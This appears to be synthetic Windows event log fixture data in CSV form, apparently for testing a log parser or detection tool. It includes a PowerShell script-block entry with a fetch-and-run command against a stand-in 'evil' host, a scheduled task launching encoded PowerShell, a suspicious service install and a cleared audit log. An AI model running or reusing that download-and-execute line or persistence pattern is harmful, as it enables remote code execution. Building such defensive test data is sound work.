EventID,Channel,Provider,TimeCreatedUtc,Computer,Payload
4624,Security,Microsoft-Windows-Security-Auditing,2026-03-28T11:00:00Z,MOVISTAR-PC,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""SYSTEM""},{""@Name"":""TargetDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""TargetLogonId"",""#text"":""0x3E7""},{""@Name"":""LogonType"",""#text"":""5""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\services.exe""},{""@Name"":""IpAddress"",""#text"":""-""}]}}"
4625,Security,Microsoft-Windows-Security-Auditing,2026-03-28T11:05:00Z,MOVISTAR-PC,"{""EventData"":{""Data"":[{""@Name"":""TargetUserName"",""#text"":""bob""},{""@Name"":""TargetDomainName"",""#text"":""CONTOSO""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""IpAddress"",""#text"":""10.0.0.5""},{""@Name"":""Status"",""#text"":""0xc000006d""},{""@Name"":""SubStatus"",""#text"":""0xc000006a""}]}}"
4625,Application,Microsoft-Windows-EventSystem,2026-03-28T11:06:00Z,MOVISTAR-PC,"{""EventData"":{""Data"":[{""@Name"":""TargetUserName"",""#text"":""noise""}]}}"
4688,Security,Microsoft-Windows-Security-Auditing,2026-03-28T11:10:00Z,MOVISTAR-PC,"{""EventData"":{""Data"":[{""@Name"":""NewProcessName"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""ProcessCommandLine"",""#text"":""cmd.exe /c whoami""},{""@Name"":""ParentProcessName"",""#text"":""C:\\Windows\\explorer.exe""},{""@Name"":""SubjectUserName"",""#text"":""alex""},{""@Name"":""SubjectDomainName"",""#text"":""CONTOSO""}]}}"
4104,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,2026-03-28T11:15:00Z,MOVISTAR-PC,"{""EventData"":{""Data"":[{""@Name"":""ScriptBlockText"",""#text"":""Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil')""},{""@Name"":""ScriptBlockId"",""#text"":""block-1""},{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""4""}]}}"
7045,System,Service Control Manager,2026-03-28T11:20:00Z,MOVISTAR-PC,"{""EventData"":{""Data"":[{""@Name"":""ServiceName"",""#text"":""MalSvc""},{""@Name"":""ServiceFileName"",""#text"":""C:\\ProgramData\\svc.exe""}]}}"
4698,Security,Microsoft-Windows-Security-Auditing,2026-03-28T11:25:00Z,MOVISTAR-PC,"{""EventData"":{""Data"":[{""@Name"":""TaskName"",""#text"":""\\Microsoft\\Windows\\Updater""},{""@Name"":""TaskContent"",""#text"":""<Task><Actions><Exec><Command>powershell.exe</Command><Arguments>-enc SQBFAFgA</Arguments></Exec></Actions></Task>""}]}}"
5156,Security,Microsoft-Windows-Security-Auditing,2026-03-28T11:30:00Z,MOVISTAR-PC,"{""EventData"":{""Data"":[{""@Name"":""Application"",""#text"":""C:\\Windows\\System32\\curl.exe""},{""@Name"":""SourceAddress"",""#text"":""10.0.0.2""},{""@Name"":""SourcePort"",""#text"":""50000""},{""@Name"":""DestAddress"",""#text"":""8.8.8.8""},{""@Name"":""DestinationPort"",""#text"":""443""},{""@Name"":""Protocol"",""#text"":""TCP""}]}}"
1116,Microsoft-Windows-Windows Defender/Operational,Microsoft-Windows-Windows Defender,2026-03-28T11:35:00Z,MOVISTAR-PC,"{""EventData"":{""Data"":[{""@Name"":""ThreatName"",""#text"":""TestMal""},{""@Name"":""Path"",""#text"":""C:\\Users\\Public\\bad.exe""}]}}"
1102,Security,Microsoft-Windows-Eventlog,2026-03-28T11:40:00Z,MOVISTAR-PC,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserName"",""#text"":""alex""},{""@Name"":""SubjectDomainName"",""#text"":""CONTOSO""}]}}"
